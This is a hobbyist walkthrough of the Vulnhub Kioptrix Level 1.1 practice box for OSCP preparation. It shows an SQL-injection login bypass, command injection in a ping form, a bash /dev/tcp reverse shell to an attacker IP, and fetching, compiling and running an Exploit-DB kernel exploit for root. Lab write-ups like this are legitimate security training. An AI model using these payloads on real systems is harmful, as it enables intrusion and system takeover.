# Kioptrix: Level 1.1 (#2)

Hey Fam! Recently i have started solving `Vulnhub` Boxes for my `OSCP` Preparation! 
In the process of solving boxes i thought it would be really nice if i document stuffs in a organized manner so that it would help me as well as others to go through when they are stuck at some point!

So, without wasting time let's get started!

## Download

This is an easy box, You can get it from [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

![Image](https://i.imgur.com/1RyhLoC.png)

Download the `.rar`
- `NOTE:` Some links are broken, But the highlighted one should work fine!

![Image](https://i.imgur.com/ZCQ4gwY.png)

Once Done with the download,Unzip it and Open the file in [VMware Workstation](https://www.vmware.com/in/products/workstation-pro/workstation-pro-evaluation.html) 

Your VMware Libraby should look like this,

![Image](https://i.imgur.com/qhJDfzP.png)

`NOTE:` Make sure both your attacking machine and Target Machine are running in `Bridged Network`

## IP Discovery

This is a simple `.vmx` file so we don't know what is it's IP! Just power On the victim Machine `(Kioptrix Box)` 

To find the Box's IP we can use a tool called [`netdiscover`](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html#:~:text=netdiscover%20is%20an%20active%2Fpassive,DHCP%20servers%20in%20wardriving%20scenarios.&text=Built%20on%20top%20of%20libnet,them%20by%20sending%20ARP%20requests.) (Pre-Installed in Kali and other distros)

Let's Fire  it up!

```
sudo netdiscover
```
![Image](https://i.imgur.com/tI0Pi85.png)

This gives a set of IP address but the one we are intrested in Is this `192.168.43.9`

## Scanning and Enumeration

Now as we got the IP address of our Victim machine, Let's scan for open ports and services running in it!

```
nmap -sC -sV -A 192.168.43.9 -oN scan.txt
```
The above command will give us a basic scan report , You can use `-p-` and more flags for detailed information
You can use `man` command to get a detail list of flags that you can use with nmap, Go for it! give it a try :)

![Image](https://i.imgur.com/FH0EEm7.png)

We can see we have some intresting ports opened in this box!

- Port `80` `http`
- Port `22` `ssh`
- Port `3306` `mysql`
- Port `443` `https`

## Gaining Foothold

Let's have a look on `http` page running at Port `80`

![Image](https://i.imgur.com/8q8YtJj.png)

We see a login page! After trying defaul creds, `admin:admin` which gave nothing :(
Then i tried `SQLi` using this `' OR 1=1 --` basic payload in both `user:pass`

Wohhhhhhhhh!! We logged In

![Image](https://i.imgur.com/uhuXMu4.png)

We can see, Here we can ping any IP address and hopefully we will get a response!
Let's try pinging to `8.8.8.8` 

![Image](https://i.imgur.com/WIhVuif.png)

We can ping it! So there is a chance that we can execute commands here! Let's give it a try

```
; whoami
```
![Image](https://i.imgur.com/Bb5LuN9.png)

The above command is terminating ping command and executing `whoami`

Now we are confirmed that we can execute commands remotely in this web page, Let's take advantage of this and try gaining a a `reverse shell` from it

```
 8.8.8.8; bash -i >& /dev/tcp/192.168.XX.XXX/1234 0>&1
```
![Image](https://i.imgur.com/RH41Kgv.png)

In the above command i am using a reverse shell bash command which will give me a shell in my attacking machine

Before hitting the submit button on the web page, run

```
nc -lvnp 1234
```
![Image](https://i.imgur.com/cTvgg9t.png)

This command is waiting for a connection from our target machine! Now let's hit the `submit` button

![Image](https://i.imgur.com/o8uH5Dv.png)

We got an initial shell and we can see we are `apache`

I have searched for many things here but didn't get anything to prev esc!

## Privilege Escalation

Now, Let's check it's release and kernel version

```
cat /etc/*-release
```
The above command will give us latest release of that perticular OS

![Image](https://i.imgur.com/9zueYKG.png)

```
uname -rms
```
The above command will give us kernel version 

![Image](https://i.imgur.com/3kdT0gK.png)

Let's check out for exploits with the above information we got!

![Image](https://i.imgur.com/HZbAAFh.png)

Let's go with the highlighted Exploit available in [Exploitdb](https://www.exploit-db.com/exploits/9545)

```
cp /usr/share/exploitdb/exploits/linux/local/9545.c . 
```
The above command copies the exploit code to my working Dir

```
mv 9545.c exploit.c
```
I chaged the name of `9545.c` to `exploit.c`

Now let's transfer `exploit.c` to our attacking machine

To achieve the above purpose i used a `python server` in my local machine

```
python3 -m http.server 8000
```
![Image](https://i.imgur.com/Lo5JVMm.png)

Now in the target machine, got to `/tmp` and run,

```
wget http://<IP>:8000/exploit.c
```
This above command will download `exploit.c` in target machine

![Image](https://i.imgur.com/cH1mkyS.png)

Time to compile the code

```
gcc -o exploit exploit.c
```
This command will create another file named `exploit`

![Image](https://i.imgur.com/36nvILE.png)

Make `exploit` Executable

```
chmod 755 exploit
```
Finally run the Executable and gain `root`

![Image](https://i.imgur.com/BL0lbRg.png)

Wooooohhhhhhhhhhhhh! Finally we rooted the Box :)


# Thank You

I hope you learnt something from this walkthrough! Looking forward to make more such walkthroughs! 
`Happy Hacking!`

By, `Deviner`
